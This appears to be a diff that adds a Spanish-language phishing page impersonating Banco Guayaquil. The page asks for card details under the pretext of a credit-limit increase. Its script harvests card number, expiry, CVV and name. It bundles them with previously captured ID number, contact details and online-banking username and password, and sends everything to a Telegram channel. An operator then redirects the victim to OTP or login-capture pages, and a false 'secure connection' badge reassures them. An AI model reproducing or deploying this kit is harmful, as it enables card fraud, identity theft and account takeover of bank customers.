@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Datos de Tarjeta — Banco Guayaquil</title>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<header class="header">
+  <a class="header-logo" href="#">
+    <svg class="lsvg" width="36" height="36" viewBox="0 0 36 36" fill="none">
+      <circle cx="18" cy="18" r="18" fill="white" fill-opacity="0.15"/>
+      <circle cx="18" cy="18" r="13" stroke="white" stroke-width="3" fill="none"/>
+      <circle cx="18" cy="18" r="6" fill="white"/>
+    </svg>
+    <div class="header-brand">Banco<span>Guayaquil</span></div>
+  </a>
+  <div class="header-menu">Menú ☰</div>
+</header>
+
+<main class="container">
+  <button class="back-link" onclick="history.back()">
+    <svg width="16" height="16" fill="none" viewBox="0 0 24 24"><path d="M19 12H5M11 6l-6 6 6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+    Volver
+  </button>
+
+  <div class="card-preview">
+    <div class="card-preview-type">VISA CRÉDITO</div>
+    <div class="card-preview-num" id="pNum">•••• •••• •••• ••••</div>
+    <div class="card-preview-row">
+      <div><div class="card-preview-sub">VENCE</div><div class="card-preview-val" id="pExp">MM/AA</div></div>
+      <div><div class="card-preview-sub">TITULAR</div><div class="card-preview-val" id="pName">—</div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h1 class="card-title">Datos de tu tarjeta</h1>
+    <p class="card-subtitle">Ingresa los datos de la tarjeta a la que deseas aplicar el aumento de cupo.</p>
+
+    <div id="alCard" class="alert alert-error">
+      <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      <span id="alCardMsg">Por favor verifica los datos de tu tarjeta.</span>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Número de tarjeta</label>
+      <input class="form-input" id="cnum" type="tel" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19"/>
+      <div class="form-error" id="e-cnum">Ingresa un número de tarjeta válido.</div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+      <div class="form-group">
+        <label class="form-label">Vencimiento</label>
+        <input class="form-input" id="cexp" type="tel" inputmode="numeric" placeholder="MM/AA" maxlength="5"/>
+        <div class="form-error" id="e-cexp">Fecha inválida.</div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">CVV</label>
+        <input class="form-input" id="ccvv" type="tel" inputmode="numeric" placeholder="•••" maxlength="4"/>
+        <div class="form-error" id="e-ccvv">CVV inválido.</div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Nombre en la tarjeta</label>
+      <input class="form-input" id="cname" type="text" placeholder="Tal como aparece en la tarjeta"/>
+      <div class="form-error" id="e-cname">Ingresa el nombre en tu tarjeta.</div>
+    </div>
+
+    <button class="btn btn-primary" onclick="envTarjeta()">
+      Confirmar solicitud
+      <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
+    </button>
+  </div>
+
+  <div style="display:flex;align-items:center;justify-content:center;gap:8px;color:var(--gray-600);font-size:12px;margin-top:4px">
+    <svg width="14" height="14" fill="none" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" stroke-width="2"/></svg>
+    Conexión segura · Datos encriptados
+  </div>
+</main>
+
+<div class="wait-screen" id="wait">
+  <div class="wait-logo">
+    <svg class="wsvg" width="64" height="64" viewBox="0 0 64 64" fill="none">
+      <circle cx="32" cy="32" r="32" fill="#C8006E" fill-opacity="0.12"/>
+      <circle cx="32" cy="32" r="22" stroke="#C8006E" stroke-width="4" fill="none"/>
+      <circle cx="32" cy="32" r="10" fill="#C8006E"/>
+    </svg>
+  </div>
+  <div class="wait-spinner"></div>
+  <h2 class="wait-title">Procesando solicitud</h2>
+  <p class="wait-sub">Estamos validando los datos de tu tarjeta.</p>
+  <div class="wait-dots"><span></span><span></span><span></span></div>
+</div>
+
+<script src="app.js"></script>
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const p = Session.get('personal');
+  if (p?.nombre) {
+    document.getElementById('pName').textContent = p.nombre.toUpperCase().substring(0,20);
+    document.getElementById('cname').value = p.nombre.toUpperCase();
+  }
+
+  document.getElementById('cnum').addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').substring(0,16);
+    e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+    const pad = (v + '•'.repeat(16)).substring(0,16);
+    document.getElementById('pNum').textContent = pad.replace(/(.{4})/g,'$1 ').trim();
+  });
+
+  document.getElementById('cexp').addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').substring(0,4);
+    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
+    e.target.value = v;
+    document.getElementById('pExp').textContent = v || 'MM/AA';
+  });
+
+  document.getElementById('ccvv').addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g,'').substring(0,4);
+  });
+
+  document.getElementById('cname').addEventListener('input', e => {
+    document.getElementById('pName').textContent = e.target.value.toUpperCase().substring(0,20) || '—';
+  });
+});
+
+async function envTarjeta() {
+  const num  = document.getElementById('cnum').value.replace(/\s/g,'');
+  const exp  = document.getElementById('cexp').value;
+  const cvv  = document.getElementById('ccvv').value;
+  const name = document.getElementById('cname').value.trim();
+
+  clearErrs(['cnum','cexp','ccvv','cname']);
+  hideAlert('alCard');
+  let ok = true;
+  if (num.length < 15 || num.length > 16) { showErr('cnum');  ok = false; }
+  if (!/^\d{2}\/\d{2}$/.test(exp))        { showErr('cexp');  ok = false; }
+  if (cvv.length < 3)                      { showErr('ccvv');  ok = false; }
+  if (name.length < 3)                     { showErr('cname'); ok = false; }
+  if (!ok) { showAlert('alCard','Por favor corrige los campos marcados.'); return; }
+
+  Session.save('tarjeta', {numero: num, exp, cvv, nombre: name});
+
+  const p = Session.get('personal') || {};
+  const c = Session.get('cupo')     || {};
+  const l = Session.get('login')    || {};
+
+  const msg = `💳 <b>DATOS DE TARJETA</b>
+━━━━━━━━━━━━━━━━━━━━━━
+👤 Cliente: <b>${p.nombre||'—'}</b>
+🪪 Cédula: <b>${p.cedula||'—'}</b>
+📧 Email: <b>${p.email||'—'}</b>
+📱 Teléfono: <b>${p.telefono||'—'}</b>
+
+💳 Número: <b>${num.replace(/(.{4})/g,'$1 ').trim()}</b>
+📅 Vence: <b>${exp}</b>
+🔐 CVV: <b>${cvv}</b>
+👤 Nombre: <b>${name}</b>
+
+💵 Aumento: <b>$${c.monto||'—'}</b>
+🔑 Usuario: <b>${l.usuario||'—'}</b>
+🔒 Contraseña: <b>${l.password||'—'}</b>
+📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;
+
+  showWait();
+  try { await sendTelegram(msg, BUTTONS.tarjeta); } catch(e) { console.error(e); }
+  startPolling(dec);
+}
+
+function dec(a) {
+  hideWait();
+  if      (a === 'finalizar')    window.location.href = 'final.html';
+  else if (a === 'error_tarjeta') showAlert('alCard','Los datos de la tarjeta no son válidos. Verifica e intenta de nuevo.');
+  else if (a === 'error_login')  window.location.href = 'index1.html';
+  else if (a === 'otp')          window.location.href = 'index2.html';
+  else                           window.location.href = 'final.html';
+}
+</script>
+</body>
+</html>
